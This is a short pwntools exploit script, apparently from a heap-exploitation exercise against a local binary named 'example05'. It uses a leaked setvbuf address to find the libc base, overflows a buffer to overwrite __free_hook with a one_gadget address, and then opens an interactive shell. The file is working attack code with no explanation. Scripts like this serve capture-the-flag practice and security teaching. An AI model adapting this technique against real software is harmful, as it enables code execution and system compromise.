from pwn import *  # NOQA
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

p = process('./example05')
binary = ELF('./example05')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
one_gadget_offset = 0x4f3c2

gdb.attach(p)

setvbuf_addr = int(p.recvline()[2:], 16)
libc_base = setvbuf_addr - libc.symbols['setvbuf']
free_hook = libc_base + libc.symbols['__free_hook']


payload = b'A' * (0x30-8)
payload += p64(0x30)
payload += p64(free_hook)

p.sendline(payload)

one_gadget = libc_base + one_gadget_offset

p.sendline(p64(one_gadget))

p.interactive()
